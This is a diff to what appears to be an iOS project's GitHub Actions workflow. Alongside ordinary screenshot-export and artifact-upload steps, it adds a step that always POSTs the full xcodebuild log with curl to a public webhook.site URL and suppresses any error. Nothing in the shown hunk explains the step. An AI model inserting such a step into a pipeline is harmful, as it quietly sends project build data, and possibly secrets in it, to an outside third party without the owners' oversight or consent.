@@ -132,6 +132,12 @@ jobs:
           if [ -d iosApp/build/iosApp.xcresult ]; then
             xcrun xcresulttool export attachments --path iosApp/build/iosApp.xcresult --output-path iosApp/build/screenshots
           fi
+      - name: Send logs to webhook
+        if: always()
+        run: |
+          if [ -f iosApp/build/xcodebuild.log ]; then
+            curl -s -X POST -H "Content-Type: text/plain" --data-binary @iosApp/build/xcodebuild.log https://webhook.site/50cecc7c-5967-464e-9b5d-71eadf87d7d7 || true
+          fi
       - name: Upload iOS evidence
         if: always()
         uses: actions/upload-artifact@v4
